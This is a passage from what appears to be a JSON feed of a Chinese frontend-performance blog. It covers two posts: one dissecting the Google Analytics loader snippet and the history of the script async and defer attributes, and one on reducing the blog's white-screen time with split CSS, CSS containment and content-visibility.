Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div 